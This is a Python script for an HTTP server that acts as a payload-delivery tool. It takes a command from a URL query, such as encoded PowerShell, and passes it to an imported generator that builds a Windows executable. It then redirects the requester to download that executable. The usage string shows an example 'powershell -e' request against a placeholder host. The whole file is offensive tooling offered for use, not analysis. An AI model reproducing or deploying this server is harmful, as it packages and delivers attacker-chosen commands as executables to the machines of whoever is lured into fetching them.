from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse, json, urllib, winExecGen, sys, shutil, os

class GetHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        print(parsed_path)
        if "/out.exe" in parsed_path:
            self.path = 'out.exe'
            self.send_response(200)
            self.send_header("Content-Type", 'application/x-msdownload')
            with open(self.path, 'rb') as f:
                fs = os.fstat(f.fileno())
                self.send_header("Content-Length", str(fs.st_size))
                self.end_headers()
                self.wfile.write(bytes(f.read()))
                print('hit')
        else:
            winExecGen.encodePayload("./out.exe", urllib.parse.unquote(parsed_path.query.split("=",1)[-1]))
            self.send_response(301)
            self.send_header('Location','http://'+ sys.argv[1] + ':' + sys.argv[2] + '/out.exe')
            self.end_headers()
        return

if __name__ == '__main__':
    #from BaseHTTPServer import HTTPServer
    server_class = HTTPServer
    if len(sys.argv) != 3:
        print("usage: "+sys.argv[0]+" 1.3.3.7 8080, make request to http://1.3.3.7:8080/?c=powershell -e oirgjdfoigjdfgijdfgdfhgikhgfgihk, urlencode whatever you think will break it")
    server = server_class((sys.argv[1], int(sys.argv[2])), GetHandler)
    print('Starting server at http://'+sys.argv[1]+':'+sys.argv[2])
    server.serve_forever()
